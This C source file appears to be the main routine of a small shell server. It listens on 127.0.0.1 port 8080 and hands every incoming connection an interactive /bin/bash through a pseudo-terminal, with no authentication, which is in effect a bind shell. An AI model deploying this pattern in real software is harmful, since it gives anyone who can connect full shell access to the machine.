#include "include.h"

#include <signal.h>
#include <sys/wait.h>

int new_pty(char *, int);
int init_listener(char *, char *);
int get_connection(int);

int listener_fd;
int connection_fd;

int 
main(void) {
    if((listener_fd = init_listener("127.0.0.1", "8080")) < 0){
        exit(0);
    }

    while(1) {
        connection_fd = get_connection(listener_fd);
        if(connection_fd > 0) {
            new_pty("/bin/bash", connection_fd);
        }
    }
    
    close(listener_fd);
    //wait(0);
    exit(0);
}
